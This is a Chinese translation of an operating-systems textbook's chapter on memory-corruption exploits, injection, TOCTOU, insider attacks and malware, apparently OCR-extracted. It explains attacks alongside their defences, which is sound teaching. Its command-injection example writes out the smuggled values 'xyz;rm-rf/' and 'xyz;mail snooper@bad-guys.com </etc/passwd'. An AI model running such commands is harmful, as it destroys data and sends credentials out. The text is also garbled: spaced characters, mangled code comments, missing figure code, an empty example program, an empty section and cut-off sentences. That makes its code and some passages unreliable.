在刘易斯 ·卡洛尔 (Lewis Caroll) 的著作《爱丽丝镜中奇遇记》(Through the Looking Glass) 中 ， 红皇后带着爱丽丝疯狂地奔跑。
她们竭尽全力，但是无论跑得多快，还是被困在同一个地方。
爱丽丝说： “在我们的国家，如果像这样一直快跑，那么通常可以到达别的地方。
”皇后说：“你看，现在你尽全力 奔跑，来使自己能够停留在某一个位置。
如果你想到达其他地方，就必须以至少两倍的速度跑!
”
红皇后效应是典型的进化军备竞赛。
在过去的几百万年中，斑马和狮子的祖先都进化了。
斑马跑得 更快也有更敏锐的视觉、听觉和嗅觉来发现食肉动物，这对于躲避狮子很有用。
但与此同时，狮子也变 得更快、更强壮、更健康、更擅长隐匿，这些进化对于捕食斑马有很大的作用。
所以，虽然狮子和斑马 都“改善了”自己的设计，但是它们并没有在捕食关系中获得更大的成功，而是仍要在野外努力求生。
红皇后效应也适用于漏洞攻击。
为了应对日益先进的安全措施，攻击手段也变得越来越复杂。
虽然每一个漏洞都与特定程序中的缺陷相关，但总有几类漏洞经常发生，它们值得我们研究以理解 攻击是如何奏效的。
在接下来的几节中，我们不仅会对这些手段进行研究，而且会介绍阻止、避免这些 攻击的对策，同时也会介绍一些对抗措施以应对这些把戏。
这将为你提供关于攻击者与防御者的军备竞 赛的有益思路——就像与红皇后跑步一样。
首先，我们从古老的缓冲区溢出开始讨论，这是计算机安全史上最重要的漏洞利用技术之一。
这项 技术被用在Robert Morris Jr.于1988年编写的第一个网络爬虫中，并且至今仍被广泛使用。
对于这种技术 我们已经拥有很多的应对措施，然而，研究者们预测缓冲区溢出仍将存在很长一段时间 (Van der Veen, 2012)。
针对缓冲区溢出，我们会介绍三个在大多数现代系统中最重要的保护机制：栈金丝雀保护，数 据执行保护，地址空间布局随机化。
之后，我们将介绍其他漏洞利用技术，例如格式化字符串攻击、整 数溢出、悬挂指针漏洞等。
所以请做好准备并带上你的黑帽子!
9.7.1 缓冲区溢出攻击
几乎所有操作系统和大部分应用程序都是用C 语言或C++ 语言编写的(因为程序员钟爱它们，它们
能够被编译为十分高效的目标代码),因此它们成为很多攻击的源头。
遗憾的是，C 和C++ 的编译器都没 有 数 组 边 界 检 查 。
举 例 来 说 ，C 语 言 库 中 的gets 函 数 臭 名 昭 著 , 该 函 数 读 取 一 个 字 符 串 ( 大 小 未 知 ) 到 一 个固定大小的缓冲区中，但是不进行溢出检查，这个函数很容易成为缓冲区溢出攻击的目标( 一 些编 译器甚至能探测到gets 函数的使用并做出警告)。
所以，以下的代码也没有进行检查：
01.void A(){
02. char B[128]; /*在栈中预留128字节给缓冲区*/
03. printf("Type log message:");
04. gets (B); /*从标准输入读日志信息到缓冲区B*/
05. writeLog(B); 1*以特定格式化方式将字符串输出到日志文件*/ 06.}
虽然并不明显，但上述代码有 一 个严重的错误。
造成这个问题的原因是gets 函数会 一 直读取标准输 入的字符，直到碰到换行符。
它不知道缓冲区B 只能装载128字节的数据。
假设用户输入了256个字符， 多出来的128个字节会发生什么?
因为gets 函数不检查缓冲区边界，所以其余的字节也会被存储在栈中， 就像缓冲区有256字节 一 样。
这样 一 来，原本存储在这些区域中的内容就被覆盖掉了，其后果通常是灾 难性的 。
在图9 - 2 1a 中 ， 主 程 序 在 运 行 时 ， 它 的 局 部 变 量 存 放 在 栈 中 。
在 某 个 节 点 它 调 用 了 函 数A, 如 图 9-21b 所示。
标准调用序列通过将返回地址(指向调用后的指令)推至栈而开始运行。
然后将控制转为A, 将栈指针减少128字节来为局部变量分配存储空间(缓冲区B)。
虚拟地址空间 虚拟地址空间 虚拟地址空间
图9- 21 a) 主 程 序 运 行 时 的 情 形 ；b) 进 程A 被 调 用 后 的 情 形 ；c) 缓 冲 区 溢 出 用 灰 色 表 示
所以如果用户输入超过128个字节究竟会发生什么?
图9 - 21c 展 示 了 这 种 情 况 。
前 面 提 到 ，gets 函 数 复制所有字节填充至缓存区并导致溢出，这可能会在栈中重写很多内容，但是返回地址会首先被覆盖。
换句话说，某些日志项所填充的位置是系统假定存放指令地址的位置，而这 一 地址恰好是函数返回时将 跳转到的位置。
在用户输入的常规日志信息中，很可能含有无效的地址字符。
因此 一 旦函数A 返 回 ， 程 序就将试着跳转到无效目标 — — 这是任何系统都不希望发生的。
在多数的情况下，程序会马上崩溃。
现在假设并不是某个善良的用户冒失地输入了过长的信息，而是攻击者在别有用心地破坏程序的控 制流。
也就是说，攻击者提供了 一 个精心准备的输入，利用缓冲区B的地址来重写返回地址。
结果就是，
从函数A返回后，程序会跳转至缓冲区B的开头，并且将执行里面的代码。
因为攻击者控制了缓冲区的 内容，所以他可以利用机器指令填充该缓冲区，并在原始程序的上下文中执行攻击代码。
实际上，攻击 者用自己的代码覆盖了内存并使其得以执行。
该程序现在完全处于攻击者的控制之下，他可以为所欲为。
通常情况下，攻击者代码用于启动壳(例如通过exec 系统调用),使入侵者可以方便地访问机器。
因此， 这样的代码就是俗称的shellcode,即使它不产生壳。
这种攻击手段不仅能够作用于使用gets 函数的程序(虽然你应该尽量避免使用这个函数),也可以 作用于任何复制缓冲区中用户提供的数据但没有进行边界冲突检查的程序。
这些用户数据可以由命令行 参数、环境字符串、通过网络连接发送的数据或从用户文件读取的数据组成。
有很多函数可以复制或移 动这种数据，包括strcpy 、memcpy 、strcat 等。
当然你自己写的移动若干字节到缓冲区的循环操作也可 能受到攻击。
1.栈金丝雀保护
一种常用的防御上述攻击的方法是使用栈金丝雀保护。
这个名字来源于采矿业。
在矿井中工作是很 危险的，一氧化碳等有毒气体可能会聚集并使矿工中毒。
一氧化碳是无味的，矿工无法察觉。
过去的做 法是矿工把金丝雀带入矿井中作为早期的预警系统。
有毒气体增多时，在主人受到伤害之前，金丝雀会 先被毒死。
如果你的鸟死了，那么有可能是时候赶快离开矿井了。
现代计算机系统仍然使用(数字)金丝雀作为早期的报警系统。
这个想法非常简单。
在程序调用函 数的地方，编译器在栈中插入代码来保存一个随机的金丝雀值，就在返回地址之下。
从调用返回时，编 译器插入代码来检测这个金丝雀值，如果这个值变了，就是出错了。
在这样的情况下，最好是停止运行 并处理故障而不是继续运行程序。
2.避免栈金丝雀
金丝雀在对抗上述攻击时是有效的，但仍有许多缓冲区溢出可能发生。
例如，考虑图9-22中的代码 片段。
它使用了两个函数。
strcpy是C 语言函数库中复制字符串到缓冲区中的函数，strlen用于确定字符 串的长度。
图9-22 跳过栈金丝雀：通过修改len, 攻击能够绕过金丝雀并直接修改返回地址
在上面的例子中，函数A从标准输入中读取日志信息，但是这次它明确地使用当前日期来做准备工 作(作为函数A的字符串参数)。
首先，将日期复制到日志信息中(第6行)。
日期字符串可能有不同的长
让我们假设系统使用栈金丝雀保护，那么怎样才能改变返回地址?
处理手段是当攻击者将缓冲区B 溢出时，他不会直接去命中返回地址。
相反，他修改栈中在返回地址上面的变量len。
在第9行中，len 作 为偏移量来决定缓冲区B中的内容将被写在哪里。
程序员的想法是仅仅跳过日期字符串，但是由于攻击 者控制了len变量，因此可以使用它来跳过金丝雀并且重写返回地址。
此外，缓冲区溢出并不仅限于返回地址，通过溢出可以触碰的函数指针也是可以被利用的。
函数指 针就像平常的指针一样，只是它指向函数而非数据。
例如，C 和C++允许程序员申明变量f作为指向函数 的指针，这个函数有一个字符串参数，返回为空，如下所示：
void (*f)(char*);
语法可能有点晦涩难懂，但实际上它只是另一个变量声明。
由于之前例子中的函数A符合上面的特 征，因此我们可以写f=A 并在程序中使用f来代替A。
函数指针方面的细节超出了本书范围，但是函数指 针在操作系统中相当常见。
现在假设攻击者试图重写一个函数指针。
在函数使用函数指针的时候，它就 会调用攻击者嵌入的代码。
为了成功利用该漏洞，函数指针甚至不需要在栈上。
堆上的指针函数也同样 可以被利用。
只要攻击者能够改变函数指针的值或返回地址到包含攻击者代码的缓存区，他就能改变程 序的控制流。
3.数据执行保护
也许现在你会惊呼：“等一下!
问题的真正根源不是攻击者能够覆盖函数指针和返回地址，而是他 可以注入代码并执行。
为什么不禁止在堆和堆栈上执行字节?
”如果是这样，你就顿悟了。
然而，我们 很快就会看到，顿悟也不能阻止所有的缓冲区溢出攻击。
不过这个想法还是不错的。
如果攻击者提供的 字节不能作为合法代码来执行，代码注入攻击就会失效。
现代CPU有一个被人们称为NX位的功能，NX 代表不执行。
它对于区分数据段(堆、栈、变量和全 局变量)和文本段(包含代码)是非常有用的。
具体来说，许多现代操作系统试图确保数据段是可写的， 但不可执行，并且文本段是可执行的，但不可写。
这个策略在OpenBSD 上被称为W^X(W 异或X) 。
它 表示内存是可写的或可执行的，但不是两者都可以。
Mac OS X 、Linux和Windows 有类似的保护方案。
该安全措施的通用名称是DEP (数据执行保护)。
有些硬件不支持NX位，在这种情况下，DEP 仍然工作， 但执行发生在软件中。
DEP 可以防止迄今为止讨论的所有攻击。
攻击者可以在进程中嵌入尽可能多的shellcode 。
然而，除 非他能够使内存可执行，否则就没有办法运行它们。
4.代码重用攻击
DEP 使得在数据区域中执行代码是不可能的，栈金丝雀使其更难(但不是不可能)改写返回地址和 函数指针。
不幸的是，这并不是故事的结局，因为攻击者也会得到启发——已经有大量的二进制数据在 那里了，为什么还要嵌入代码?
换言之，攻击者不需要引入新的代码，只需基于二进制文件和库中现有 的函数和指令构造必要的功能。
我们先来看看最简单的攻击返回libc, 然后讨论更复杂但非常流行的返 回导向编程技术。
假设图9-22的缓冲区溢出漏洞已经覆盖当前函数的返回地址，但不能执行攻击者在栈中提供的代码。
问题是，它能返回到别的地方吗?
答案当然是可以。
几乎所有的C程序都链接libc 库，这个库包含大部分 C 程序所需的关键函数。
system 函数是常用的关键函数之一，会接收字符串作为输入，并将其传入shell 程序中执行。
通过使用system函数，攻击者能执行任何它想执行的程序。
所以，攻击者仅仅需要在栈上 放置一个包含命令的字符串代替执行shellcode, 并通过返回地址来转移控制至system函数。
这种攻击方式就是人们所熟知的返回libc 攻击，并且有多个变种。
system 不是攻击者唯一感兴趣的 函数。
例如，攻击者可以使用mprotect函数来让部分数据段可执行。
此外，除了显式跳转到libc函数，也 存在一些隐式攻击方式。
在Linux中，攻击者可以返回PLT (过程链接表)。
PLT是一个使动态链接更容
易的结构，并且包含执行时依次调用动态链接函数的代码段，返回此代码然后间接执行库函数。
返回导向编程 (RO P) 的概念是将程序代码重用到极致的想法。
利用返回导向编程，攻击者可以返 回到文本段中的任何指令而不仅仅是返回库函数的入口地址。
例如，他可以使代码从一个函数中间执行， 而不是从函数的开始。
代码会在这个点上开始执行，一次一个指令。
在少数指令执行过后，会遇到另一 个返回指令。
现在，我们再次问同样的问题：我们能返回哪里?
由于攻击者对堆栈有控制权，因此他可 以再次使代码返回他想要的任何地方，是的，当他第一次进行攻击后，他可以无限次地进行这样的攻击。
a) b)
图9-23 返回导向编程：链接小工具
返回导向编程看起来可能非常复杂。
但和以往一样，人们已经开发出尽可能自动化的工具，如小工 具收割机，甚至还有ROP 编译器。
目前，返回导向编程是最重要的攻击技术之一。
5.地址空间布局随机化
还有一个阻止这些攻击的方法。
除了修改返回地址和注入一些 (ROP) 程序，攻击者应该能够返回
与金丝雀和DEP相似，许多现代操作系统都支持ASLR, 但往往使用不同的粒度。
它们中大部分提 供给用户应用程序，只有很少一部分将它应用在系统内核中(Giuffrida 等人，2012)。
这三种保护机制 的合力显著提高了攻击者入侵的门槛。
只是跳转到嵌入代码甚至一些内存中已有的函数已经很难奏效。
它们共同构成了现代操作系统的重要防线。
它们的突出优点之一是以非常合理的性能成本来提供保护。
6.绕过ASLR
即使有这三种防御措施，攻击者还是可以攻击系统。
ASLR 有几个弱点，入侵者可以借此绕过它。
第一个弱点是ASLR的随机性不够强。
ASLR 的许多实现中仍然有一些在固定地址的代码。
再者，即使一 个片段被随机化了，该随机化也可能很薄弱，攻击者可以强行破解它。
例如，在32位系统中，因为不能 随机化栈中的all 位，所以熵将受到限制。
为了使该栈像正常的栈一样向下扩展工作，随机化最低有效位 就不是一个合理的选择。
一种更重要的对抗ASLR的攻击是通过内存泄漏形成的。
在这种情况下，攻击者利用漏洞不是为了 直接控制程序，而是泄露关于内存布局的信息，他可以利用这些信息作为第二个攻击漏洞。
作为一个简 单的例子，考虑下面的代码：
01.void C(){
02. int index;
03. int prime[16]={1,2,3,5,7,11,13,17,19,23,29,31,37,41,43,47};
04. printf("Which prime number between would you like to see?
");
05. index=read_user_input();
06. printf ("Prime number%d is:%dn",index,prime[index]); 07.}
该代码包含了一个对read_user_input 的调用，它并不是标准C语言库的部分。
我们假设它存在并会 返回用户在命令行中输入的一个整数。
同时我们也假设它没有任何错误。
即使这样，这段代码还是很容 易泄露信息。
我们需要做的就是提供一个大于15或者小于0的索引。
只要程序不检查这个索引，它就将 返回任何内存中的整数。
函数地址对于攻击而言是十分重要的。
原因是即使库装载的位置是随机的，但是每个函数位置的相 对偏移是固定的。
如果你知道一个函数，你就能找到所有函数。
即使不是这样的情况，就像Snow 等人 (2013)展示的那样，只要有一段代码地址，也是非常容易获取其他函数的位置的。
7.非控制流转向攻击
目前，我们已经考虑了针对程序控制流方面的攻击：修改函数指针和返回地址。
攻击者的目标总是 让程序执行新的功能，即使该功能已经存在于二进制代码中。
然而这不是唯一 的攻击途径。
数据本身就 是吸引攻击者的一个有趣目标，如下面这段伪代码：
01.void A(){
02. int authorized;
03.char name [128];
04.authorized=check credentials(…);/*攻击者未被授权，所以返回0*/
05. printf("What is your name?
\n");
06. gets(name);
07. if(authorized!
=0){
08. printf("Welcome %s,here is all our secret data\n",name)
09. /*…显示绝密数据…*/
10. }else
11. printf ("Sorry %s,but you are not authorized.\n");
12. } 13.}
该代码的目的是权限检查。
只有拥有正确权限的用户才可以查看绝密数据。
函数check_credentials 并不 是C语言库中的函数，但是我们假设它存在于程序中并且不包含任何错误。
现在假设攻击者输入129个字 符。
就像之前的例子一样，缓存区将会溢出，但是它不会修改返回地址。
不过，攻击者已经修改了 authorized 变量的值，并赋给它一个非0值。
程序不会崩溃而且不执行任何攻击者的代码，但是会将绝密 数据泄露给未授权用户。
8.缓冲区溢出——仍未到达终点
缓冲区溢出是攻击者使用的最古老、最重要的内存泄漏技术之一。
尽管20多年来出现了很多事件和 防御技术(我们只关注最重要的一些),但看起来摆脱这一问题是不可能的 (Van der Veen,2012)。
一 大部分安全问题都是由这个瑕疵造成的，并且修复它们是非常困难的，因为很多C 语言程序不检查内存 溢出。
军备竞赛从来不会结束。
世界各地的研究者都在研究新的防御手段。
在这些防御手段中，有的针对 二进制文件，有的针对C语言和C++ 编译器的安全扩展。
但需要指出的是，攻击者同样在提升他们的攻 击手段。
在本节中，我们尝试对一些重要技术进行概述，但是同样的想法也会有许多变化。
我们相当确 定的是，在本书的下一版中，这一节仍会包含相关内容(并有可能会更长)。
9.7.2 格式化字符串攻击
接下来介绍的攻击手段同样属于内存错误类型，但是本质有很大的不同。
一些程序员不喜欢打字， 即使他们是杰出的打字员。
他们在想，在rc 明显能表达相同的意思并且能省去13次键盘敲击的前提下， 为什么还要将一个变量命名为reference_count 呢?
这种对键盘打字的厌烦有时会导致下述灾难性的错误。
考虑下面这段C程序代码，它打印程序中传统的欢迎内容：
char*s="Hello World";
printf("%s",s);
在该程序中，声明字符串变量s并用字符串Hello World对其进行初始化，用零字节代表字符串的末尾。
函数printf有两个参数，格式化字符串“%s” 告诉它按何种格式打印字符串，第二个参数表示该字符串的 地址。
在执行时，这段代码在屏幕上打印该字符串(无论标准输出在哪)。
它是正确且没有漏洞的。
但是假设程序员偷懒并且将上述输入改为：
char*s="Hello World";
printf(s);
printf 的调用被允许，因为printf 函数有数量可变的参数，这些参数的第一个必须是格式化字符串， 但是不包含任何格式声明信息(例如“%s”) 的字符串也是合法的。
尽管第二个版本不是很好的编程习 惯，但它是被允许且能够工作的。
最重要的是这样节省了五个字符的键盘输入，显然是一个大胜利。
6个月后，其他程序员根据新需求来修改代码，这次首先要询问用户的名字，然后根据名字向用户 发出问候。
在仔细研究代码之后，他稍微改变了一下，像这样：
char s[100],g[100]="Hello"; gets(s);
strcat(g,s);
printf(g);
/ 声 明s 和g; 初始化g*1
/*从键盘读取字符串并保存到s*/ /*把S连接到g的后面*1
/*打印g*1
现在它读取一个字符串并把值赋给变量s, 并且将它与已经初始化的字符串g 进行字符串连接，最后 输出g中的消息。
这段程序依然运行正常，到现在为止一切安好(除了程序中使用了易受到缓冲区溢出 攻击的gets函数，尽管这样，gets函数仍然流行)。
然而，内行的用户在看到这段代码后会很快意识到从键盘输入接受的不仅仅是一个字符串，而且是 格式化字符串，这样所有被printf允许的格式化字符串都将奏效。
虽然大多数格式标识如“%s” (用于打 印字符串)和“%d” (用于打印十进制整数)可以对输出进行格式化，但有一些格式标示是特殊的。
例 如，“%n” 不打印任何东西。
它记录自己在当前字符串中所处的位置以及有多少应该已经输出的字符， 以供下一个printf的参数使用。
下面是使用“%n” 的 一个示例程序：
int main(int argc,char *argv[]) {
}
该程序被编译并运行时，它在屏幕上输出的是：
Hello world
i=6
注意到变量i的值已经被printf 的调用所修改，这个变化并不是对所有人都很明显。
打印一个格式化字符 串能让一个单词或者许多单词存储于内存中，该特性很难用得上。
printf 的这个特点是个好想法吗?
绝 对不是，但是它在当时是很方便的。
许多软件漏洞都是这样开始的。
就像之前的例子中，修改代码的程序员意外地允许程序的用户(无意中)输入一个格式化字符串。
因为输入格式化字符串可以覆盖内存，所以现在我们便得到了进行攻击所需要的工具，它可以修改栈中 printf 函数的返回地址并可以跳转到其他地方，例如一个新进入的格式化字符串。
这种方法称为格式化 字符串攻击。
要执行格式化字符串攻击并不容易。
函数printf 的字符数会存在哪儿?
就像上面展示的例子中，该 位置在格式化字符串紧接着的参数地址上。
但是在有漏洞的代码中，攻击者只能提供一个字符串 (printf 不提供第二个参数)。
实际上会发生的是，printf 函数会假定有第二个参数。
它会获取栈中的下一 个值并进行使用。
攻击者也让printf使用栈中的下一个值，例如提供如下的格式化字符串：
"%08x%n"
%08x 代表printf 将会打印下一个参数作为8位的十六进制数。
所以若该值是1,就会打印0000001。
换句话说，使用该格式 化字符串时，printf 将会简单地假设栈中的下一个值是它该打 印的32位数字，在那之后的值是它应该存储打印字符串的数 量的地址。
在本例中共有9位，其中8位用来表示十六进制数， 剩下一位是空。
假设它提供格式化字符串：
"%08x%08x%n"
在这个例子中，printf 将存储栈上的第三个格式化字符串提供 的地址所存的值，等等。
这是给攻击者提供“在任意地方写” 的格式化字符串漏洞的关键。
其细节超越了本书的范围，但 基本思路是攻击者确保正确的目标地址在栈上。
这要比你想 象的简单。
例如我们之前提供的有漏洞的代码，字符串g也 在栈中，比printf 的栈帧的地址更高(见图9-24)。
让我们假 设字符串像图9-24那样以AAAA 开始，随后的是%0x, 最 后 以 % 0n结束。
将会发生什么?
如果攻击者得到的%0x的数量 是正确的，那么他将到达格式化字符串(存储在缓冲区B) 。
换句话说，printf 将使用格式化字符串的前4个字节作为地址 进行写入。
因此，字符A的ASCII码是65(十六进制是0x41), 它将会把结果写在0x41414141, 但是攻击者也可以指定其他
图9-24 格式化字符串攻击。
得到%08x的 正确数量后，攻击者可以将格式 化字符串的前4个字符作为地址
地址。
当然它必须确保打印的字符串的数量是正确的(因为这是要被写入目标地址的内容)。
实际上会 比它多一些，但不会多很多。
如果在任何搜索引擎中输入“格式字符串攻击”,你会发现很多关于该问 题的信息。
一旦用户有能力重写内存并强制跳转到新注入的代码，代码就拥有了被攻击程序的能力和权限。
如 果程序是SETUID 权限，攻击者就能够用root 权限创造一个Shell 程序。
另一方面，例子当中固定大小的
字符串数组也可能成为缓冲区溢出攻击的目标。
9.7.3 悬垂指针
第三种坊间特别流行的内存错误攻击技术称作悬垂指针攻击。
该技术最简单的表现很容易理解，但 产生的漏洞却十分棘手。
C 和C++允许程序使用malloc 调用来分配堆中的内存，它返回指向新分配的内 存块的指针。
之后程序不再需要它时，便调用free 来释放内存。
当程序在释放内存后仍然意外地使用该 块内存时，悬垂指针错误就会发生。
考虑下面这段(极端)歧视老年人的代码：
01.int*A=(int *)malloc(128); /给128位整数分配空间*/
02.int year_of_birth =read_user_input(); /"从标准输入读取整数*/
03.if(input<1900){
04. printf("Error,year of birth should be greater than 1900 In");
05. free(A);
06.}else{
07. …
08./*用数组A做一些有趣的事情*/
09....
10.}
11..…./*更多的语句，包括申请和释放空间*/
12.A[0]=year_of_birth;
这段代码是错误的。
不仅是因为年龄歧视，也因为在第12行，它给已经释放了内存的数组A的元素 分配了一个值(第5行)。
指针A仍然指向相同的地址，但是它不应该被使用。
实际上，内存可能已经被 另一个缓冲区使用了(第11行)。
问题是会产生什么问题?
第12行的存储会更新已经不再为A所用的内存，并且可能修改了现在该内 存中的数据结构。
一般来说，这样的内存错误不是什么好事，但如果是攻击者用这样的方法操纵程序就 会更糟，因为他可以在内存中放置一个特定的堆对象，而该对象的第一个整数将包含用户权限。
这不容 易实现，但是存在这样的技术(堆风水)来帮助攻击者努力实现它。
风水是古代中国为了吉利而测算建 筑和坟墓的方位的习俗，现在，我们用它来测算堆中的内存。
如果数字风水大师成功，他就能将权限等 级设置成任意值。
9.7.4 空指针间接引用攻击
第3章中，我们详细讨论了内存管理。
你也许还记得现代操作系统如何虚拟化内核和用户进程的地 址空间。
在一个程序访问内存地址之前，MMU 将虚拟地址通过页表的方式转换为物理地址。
没有被映 射的页将不能被访问。
假设内核地址空间和一个用户进程的地址空间完全不同看起来是符合逻辑的，但 是实际上不总是这样的。
例如在Linux中，内核简单地映射到每个进程的地址空间并且当内核开始执行 系统调用时，它将在进程地址空间运行。
在32位系统中，用户空间占3GB的低位地址空间，内核占1G的 高位地址空间。
这样组合的原因在于地址空间中相互转换的代价较高。
通常这样安排不会造成任何问题。
但是当攻击者使用内核调用用户空间的函数时，情况就有所不同。
内核为什么要做这件事?
显然它不该这样做。
然而记得我们在讨论漏洞。
一个错误的内核可能在罕见和 不幸的条件下意外地应用一个空指针。
例如它可能调用一个还未进行初始化的函数指针。
最近的几年里， 在Linux内核中发现了几种这样的漏洞。
引用空指针会导致程序和系统的崩溃，所以非常危险。
在用户 进程中导致程序崩溃就已经足够严重，但在内核中会更糟糕，因为它会拿下整个系统。
崩溃发生是因为没有代码映射到第0页。
所以攻击者可以使用特殊的函数mmap来补救。
使用mmap 后，用户进程可以让内核在特定的地址中映射。
在地址0映射之后，攻击者能够在该页中写入shell 程序。
最终，它触发空指针引用，让shell 程序以核权限执行。
攻击者们在互相击掌。
用。
我们从这个漏洞中吸取的教训是内核与用户空间的交互可能在意想不到的地方出现，并且被用于提 升性能的优化技术可能导致你受到来自攻击者的困扰。
9.7.5 整数溢出攻击
9.7.6 命令注入攻击
另一个漏洞是让目标程序执行命令而没有意识到它在执行命令。
考虑在某个点目标程序需要将 用户提供的一个文件复制为一个具有新文件名的文件(可能是作为原文件的一个备份)。
如果程序员很 懒，不想专门为此写代码，他可以使用system 函数，调用该函数将fork出一个shell 并且将函数参数作为
shell 命令参数。
例如C 代码
system("Is >file-list")
fork出一个shell 并执行命令
Is>file-list
列出当前目录中的所有文件，然后将它们写入名为file-list 的文件中。
一个懒惰的程序员可能使用 图9-25所示的代码来复制文件。
图9-25 可能导致命令注入攻击的代码
程序所做的是请求用户输入源文件和目标文件的名称，使用cp 建立一个命令行，然后调用系统执行 它。
假设用户分别键入ABC 和XYZ, 则 shell 将执行的命令是
cp abc xyz
这确实复制了文件。
不幸的是，这段代码打开了一个巨大的安全漏洞，其所使用的技术被称为命令注入。
假设用户键入 abc 和 xyz;rm-rf/ 。
现在的命令行是：
cp abc xyz;rm-rf/
首先复制文件，然后尝试递归删除整个文件系统中的每个文件和每个目录。
如果程序运行在超级用户权
限，那么它很有可能成功。
当然，问题是分号之后的一切都会被执行为shell 命令。
第二个参数的另一个例子可能是 “xyz;mail snooper@bad-guys.com <letc/passwd”,这将生成
cp abc xyz;mail snooper@bad-guys.com </etc/passwd 从而将密码文件发送到未知的和不受信任的地址。
9 .7 .7检查时间/使用时间攻击
int fd;
if (access("./my_document",W_OK)!
=0){
exit(1);
fd =open("./my_document",o_WRONLY)
write(fd,user_input,sizeof (user_input));
我们假设程序有SETUID root权限而且攻击者想利用其特权写入密码文件。
当然，他对密码文件没 有写权限，但是让我们看看代码。
我们注意到的第一件事就是SETUID 程序不应该写入密码文件，它只 想写入当前工作目录中一个文件名为my_document 的文件中。
然而，尽管用户可能在当前的工作目录中 有这个文件，但这并不意味着他确实对这个文件有写权限。
例如，文件可能是另一个不属于用户的文件 的符号链接，例如密码文件。
为了防止这种情况，程序执行检查，以确保用户通过访问系统调用来对文件进行写访问。
调用检查 实际的文件(例如，如果它是一个符号链接，则将被引用),如果允许一个访问请求则返回0,否则返回 一个错误值-1。
此外，检查是使用调用进程的真实UID进行的，而不是表层UID (否则 一个SETUID 进 程总是有访问)。
只有当检查成功后，程序才会打开文件并写入用户输入。
程序看起来是安全的，但事实并非如此。
问题在于访问权限的时间和使用特权的时间是不一样的。
假设在访问检查后的一秒钟内，攻击者设法创建一个与文件名相同的符号链接到密码文件。
在这种情况 下将打开错误的文件，并最终在密码文件写入攻击者的数据。
为了摆脱它，攻击者必须与程序竞争，让 程序在正确的时间创建符号链接。
这种攻击被称为检查时间/使用时间(TOCTO U) 攻击。
另一种针对这种特殊攻击方式的分析是发 现access 系统调用并不安全。
先打开文件，然后检查使用文件描述符的权限而不是使用fstat 函数将会更 好。
文件描述符是安全的，因为它们不会被攻击者的fstat 和write 调用修改。
这表明，为操作系统设计一 个良好的API是非常重要而且相当困难的。
在本例中，设计者错了。
9.8 内部攻击
9.8.1 逻 辑 炸 弹
在软件外包盛行的时代，程序员总是很担心他们会失去工作，有时候他们甚至会采取某些措施来减轻这 种担心。
对于感受到失业威胁的程序员，编写逻辑炸弹 (logic bomb) 就成为了一种策略。
这一装置是某些公 司程序员(当前被雇用的)写的程序代码，并被秘密地放入产品的操作系统中。
只要程序员每天输入密码， 产品就相安无事。
但是一旦程序员被突然解雇并毫无警告地被要求离开时，第二天(或第二周)逻辑炸弹就 会因得不到密码而发作。
当然也可以在逻辑炸弹里设置多个变量。
一个非常有名的例子是：逻辑炸弹每天核 对薪水册。
如果某程序员的工号没有在连续两个发薪日中出现，逻辑炸弹就发作了(Spafford 等人，1989)。
逻辑炸弹发作时可能会擦去磁盘，随机删除文件，对核心程序做难以发现的改动，或者对原始文件
在很多有记录的案例中，病毒向被其感染的计算机中植入逻辑炸弹。
一般情况下，这些逻辑炸弹被 设计为在未来的某个时间“爆炸”。
然而，由于程序员无法预知那一台计算机将会被攻击，因此逻辑炸 弹无法用于保护自己不失业，也无法用户勒索。
这些逻辑炸弹通常会被设定为在政治上有重要意义的日 子爆炸，因此它们也称作时间炸弹 (time bomb)。
9.8.2 后门陷阱
另一个由内部人员造成的安全漏洞是后门陷阱 (trap door)。
这一 问题是由系统程序员跳过一些常见的检 测并插入一段代码造成的。
如程序员可以在登录程序中插入一 小段代码，让所有使用 “zzz” 登录名的用户 成功登录而无论密码文件中的密码是什么。
正常的程序代码如图9-26a所示。
改成后门陷阱程序的代码如图9- 26b 所 示 。
strcmp 这行代码的调用是为了判断登录名是否为 “zzzzz” 。
如果是，则无论输入了什么密码都可以 登录。
如果后门陷阱被程序员放入到计算机生产商的产品中并漂洋过海，那么程序员日后就可以任意登录到 这家公司生产的计算机上，而无论谁拥有它或密码是什么。
后门陷阱程序的实质是它跳过了正常的认证过程。
a) b)
图9-26 a) 正常的代码；b) 插入了后门陷阱的代码
9.8.3 登录欺骗
这种内部攻击的实施者是系统的合法用户，然而这些合法用户却试图通过登录欺骗的手段获取他人 的密码。
这种攻击通常发生在一个具有大量多用户公用计算机的局域网内。
很多大学就有可以供学生使
用的机房，学生可以在任意一台计算机上进行登录。
登录欺骗 (login spoofing)。
它是这样工作的：通常当没有人登录到UNIX终 端或局域网上的工作站时，会显示如图9-27a所示的屏幕。
当用户 坐下来输入登录名后，系统会要求输入密码。
如果密码正确，用户 就可以登录并启动shell (也有可能是GUI) 程序。
现在我们来看一看这一情节。
一个恶意的用户Mal写了一个程 序可以显示如图9-27b所示的图像。
除了内部没有运行登录程序外， 它看上去和9-27a惊人的相似，这不过是骗人。
现在Mal启动了他的
a) b)
图9-27 a) 正确的登录屏幕； b) 假 冒的登录屏幕
程序，便可以躲在远处看好戏了。
当用户坐下来输入登录名后，程序要求输入密码并屏蔽了响应。
随后， 登录名和密码后被写入文件并发出信号要求系统结束shell 程序。
这使得Mal 能够正常退出登录并触发真正
的登录程序，如图9-23a 所示。
好像是用户出现了一个拼写错误并要求再次登录，这时真正的登录程序开 始工作了。
但与此同时Mal又得到了另一对组合(登录名和密码)。
通过在多个终端上进行登录欺骗，入 侵者可收集到多个密码。
防止登录欺骗的唯一实用的办法是将登录序列与用户程序不能捕捉的键组合起来。
Windows 为此目 的采用了Ctrl-Alt-Del 。
如果用户坐在终端前开始按Ctrl-Alt-Del, 当前用户就会被注销并启动新的登录程 序。
没有任何办法可以跳过这一步。
9.9 恶意软件
在2000年之前出生的年轻人有时候为了打发无聊的时间，会编写一些恶意软件发布到网络上，当然 他们的目的只是为了娱乐。
这样的软件(包括木马、病毒和蠕虫)在世界上快速地传播开来，并被统一 称为恶意软件 (malware) 。
当报道上强调某个恶意软件造成了数百万美元的损失，或者无数人丢失了他 们宝贵的数据，恶意软件的作者会惊讶于自己的编程技艺竟然能产生如此大的影响。
然而对于他们来说， 这只不过是一次恶作剧而已，并不涉及任何利益关系。
然而这样天真的时代已经过去了，现在的恶意软件都是由组织严密的犯罪集团编写的，他们所做的 一切只是为了钱，而且并不希望自己的事情被媒体报道。
绝大多数这样的恶意软件的设计目标都是“传 播越快越好，范围越广越好”。
当一台机器被感染，恶意软件被安装，并且向在世界某地的控制者机器 报告该机器的地址。
用于控制的机器通常都被设置在一些欠发达的或法制宽松的国家。
